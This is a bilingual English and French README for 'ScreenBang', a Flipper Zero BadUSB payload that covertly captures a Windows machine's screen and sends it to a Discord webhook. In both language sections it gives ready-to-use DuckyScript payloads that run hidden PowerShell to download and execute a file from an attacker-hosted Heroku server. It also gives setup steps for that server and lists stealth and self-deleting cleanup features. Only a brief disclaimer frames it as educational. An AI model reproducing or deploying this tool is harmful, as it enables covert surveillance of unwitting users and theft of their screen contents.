For english poeple, read here. Pour les compatriotes Français, c'est plus bas :p
# **ScreenBang**

**ScreenBang** is a Flipper Zero payload designed to discreetly capture a screenshot of a target Windows machine and send it directly to a Discord server via a webhook. This tool provides both a Python-based solution and a standalone executable for flexible and seamless use.

---

## **Features**
- 📸 **Screenshot Capture**: Takes a full-screen screenshot of the target machine.
- 🚀 **Discord Webhook Integration**: Automatically sends screenshots to a Discord channel.
- 🧹 **Automatic Cleanup**: Deletes temporary files, including the executable, after execution.
- 🕵️ **Stealth Mode**: Operates using hidden PowerShell commands to avoid detection.
- 🔌 **Flipper Zero Integration**: Designed specifically for Flipper Zero's BadUSB functionality.

---

## **Project Structure**
```
ScreenBang/
│
├── bang.py               # Python script for screenshot capture and Discord webhook
├── bang.exe              # Compiled standalone executable of bang.py
├── app.py                # Flask server for hosting the scripts
├── Screen Bang PY        # Payload for downloading and executing bang.py
├── Screen Bang EXE       # Payload for downloading and executing bang.exe
├── LICENSE               # MIT license
├── README.md             # Project documentation
```

---

## **Requirements**
- A **Flipper Zero** device with BadUSB functionality enabled.
- A **Discord Webhook URL**.
- A target machine running Windows (7, 10, or 11).

### **Optional: Python-based setup**
- Python 3.8+ installed on the target machine.
- Required Python libraries:
  - `requests`
  - `Pillow`

---

## **Installation**

### **1. Modify the Webhook URL**
To use the Python script, you must replace the placeholder webhook URL with your own.

1. Open `bang.py` in any text editor.
2. Locate the line:
   ```python
   WEBHOOK_URL = "<Your discord webhook here>"
   ```
3. Replace `<Your discord webhook here>` with your actual Discord webhook URL. For example:
   ```python
   WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_id/your_webhook_token"
   ```
4. Save the file.

---

### **2. Deploy the Flask Server**
1. Clone the repository:
   ```bash
   git clone https://github.com/DuarteAd/ScreenBang.git
   cd ScreenBang
   ```
2. Install dependencies for the Flask server:
   ```bash
   pip install -r requirements.txt
   ```
3. Deploy the server to a cloud platform (e.g., Heroku):
   ```bash
   heroku create
   git push heroku main
   ```
4. The server will host `bang.py` and `bang.exe` for payloads to download.

---

### **3. Prepare Flipper Zero Payloads**
1. **For the executable**:
   - Use the `Screen Bang EXE` payload:
     ```plaintext
     REM Download and execute bang.exe
     DELAY 1000
     GUI r
     DELAY 500
     STRING powershell -WindowStyle Hidden -Command "& {Start-BitsTransfer -Source 'https://<your-heroku-app>.herokuapp.com/bang.exe' -Destination 'C:\Temp\bang.exe'; Start-Process -WindowStyle Hidden -FilePath 'C:\Temp\bang.exe'}"
     ENTER
     ```
2. **For the Python script**:
   - Use the `Screen Bang PY` payload:
     ```plaintext
     REM Download and execute bang.py
     DELAY 1000
     GUI r
     DELAY 500
     STRING powershell -Command "Invoke-WebRequest -Uri 'https://<your-heroku-app>.herokuapp.com/bang.py' -OutFile 'C:\Temp\bang.py'; python C:\Temp\bang.py"
     ENTER
     ```

---

## **Usage**
1. Load the payload onto your Flipper Zero.
2. Connect the Flipper Zero to the target Windows machine.
3. Execute the payload to capture a screenshot and send it to Discord.

---

## **Disclaimer**
- This project is for **educational purposes only**.
- Unauthorized use of this tool is **strictly prohibited** and may violate local laws.
- Ensure you have explicit permission before using this tool on any machine.

---

## **Credits**
This project was developed by **DuarteAd** with the goal of providing a practical and educational example of Flipper Zero's BadUSB capabilities.

### **Special Thanks**
- The **Flipper Zero Community** for their continuous support and innovation.
- The developers of **Pillow** and **Requests** for enabling key functionalities in this project.
- Everyone who contributed feedback and testing to improve ScreenBang.

---

## **License**
This project is licensed under the **MIT License**. You are free to use, modify, and distribute this software, provided you include proper credit to the original author.

---

## **Support**
If you encounter any issues or have suggestions for improvement, feel free to open an issue on [GitHub](https://github.com/DuarteAd/ScreenBang).


# **ScreenBang**

**ScreenBang** est un payload conçu pour le **Flipper Zero**, permettant de capturer discrètement l'écran d'une machine Windows cible et de l'envoyer directement à un serveur Discord via un webhook. Cet outil offre une solution basée sur Python ainsi qu'une version exécutable autonome pour une utilisation flexible.

---

## **Fonctionnalités**
- 📸 **Capture d'écran** : Capture l'écran complet de la machine cible.
- 🚀 **Intégration Discord** : Envoie automatiquement les captures d'écran à un canal Discord.
- 🧹 **Nettoyage automatique** : Supprime les fichiers temporaires, y compris l'exécutable, après exécution.
- 🕵️ **Mode furtif** : Fonctionne à l'aide de commandes PowerShell masquées pour rester discret.
- 🔌 **Intégration Flipper Zero** : Conçu spécifiquement pour le mode BadUSB du Flipper Zero.

---

## **Structure du projet**
```
ScreenBang/
│
├── bang.py               # Script Python pour la capture et l'envoi Discord
├── bang.exe              # Version autonome compilée de bang.py
├── app.py                # Serveur Flask pour héberger les scripts
├── Screen Bang PY        # Payload pour télécharger et exécuter bang.py
├── Screen Bang EXE       # Payload pour télécharger et exécuter bang.exe
├── LICENSE               # Licence MIT
├── README.md             # Documentation
```

---

## **Prérequis**
- Un **Flipper Zero** avec le mode BadUSB activé.
- Un **webhook Discord** valide.
- Une machine Windows (7, 10 ou 11).

### **Optionnel : Configuration Python**
- Python 3.8+ installé sur la machine cible.
- Bibliothèques Python nécessaires :
  - `requests`
  - `Pillow`

---

## **Installation**

### **1. Modifier l'URL du Webhook**
Pour utiliser le script Python, vous devez remplacer l'URL du webhook par la vôtre.

1. Ouvrez `bang.py` dans un éditeur de texte.
2. Trouvez la ligne :
   ```python
   WEBHOOK_URL = "<Your discord webhook here>"
   ```
3. Remplacez `<Your discord webhook here>` par votre URL Discord. Par exemple :
   ```python
   WEBHOOK_URL = "https://discord.com/api/webhooks/votre_webhook_id/votre_webhook_token"
   ```
4. Sauvegardez le fichier.

---

### **2. Déployer le serveur Flask**
1. Clonez le dépôt :
   ```bash
   git clone https://github.com/DuarteAd/ScreenBang.git
   cd ScreenBang
   ```
2. Installez les dépendances pour le serveur Flask :
   ```bash
   pip install -r requirements.txt
   ```
3. Déployez le serveur sur une plateforme cloud (par exemple, Heroku) :
   ```bash
   heroku create
   git push heroku main
   ```
4. Le serveur hébergera `bang.py` et `bang.exe` pour les payloads.

---

### **3. Préparer les payloads pour le Flipper Zero**
1. **Pour l'exécutable** :
   - Utilisez le payload `Screen Bang EXE` :
     ```plaintext
     REM Télécharger et exécuter bang.exe
     DELAY 1000
     GUI r
     DELAY 500
     STRING powershell -WindowStyle Hidden -Command "& {Start-BitsTransfer -Source 'https://<votre-app-heroku>.herokuapp.com/bang.exe' -Destination 'C:\Temp\bang.exe'; Start-Process -WindowStyle Hidden -FilePath 'C:\Temp\bang.exe'}"
     ENTER
     ```
2. **Pour le script Python** :
   - Utilisez le payload `Screen Bang PY` :
     ```plaintext
     REM Télécharger et exécuter bang.py
     DELAY 1000
     GUI r
     DELAY 500
     STRING powershell -Command "Invoke-WebRequest -Uri 'https://<votre-app-heroku>.herokuapp.com/bang.py' -OutFile 'C:\Temp\bang.py'; python C:\Temp\bang.py"
     ENTER
     ```

---

## **Utilisation**
1. Chargez le payload sur votre Flipper Zero.
2. Connectez le Flipper Zero à la machine Windows cible.
3. Exécutez le payload pour capturer l'écran et l'envoyer sur Discord.

---

## **Avertissement**
- Ce projet est destiné **uniquement à des fins éducatives**.
- Toute utilisation non autorisée est **strictement interdite** et peut enfreindre les lois locales.
- Assurez-vous d'avoir une autorisation explicite avant d'utiliser cet outil.

---

## **Crédits**
Ce projet a été développé par **DuarteAd** dans le but de fournir un exemple pratique et éducatif des capacités BadUSB du Flipper Zero.

### **Remerciements spéciaux**
- La communauté **Flipper Zero** pour leur soutien et leurs innovations.
- Les développeurs de **Pillow** et **Requests** pour les bibliothèques essentielles utilisées.
- Tous ceux qui ont contribué par leurs retours et tests pour améliorer ScreenBang.

---

## **Licence**
Ce projet est sous licence **MIT**. Vous êtes libre de l'utiliser, le modifier et le distribuer, à condition de créditer l'auteur original.

---

## **Support**
Si vous rencontrez des problèmes ou avez des suggestions d'amélioration, ouvrez une issue sur [GitHub](https://github.com/DuarteAd/ScreenBang).

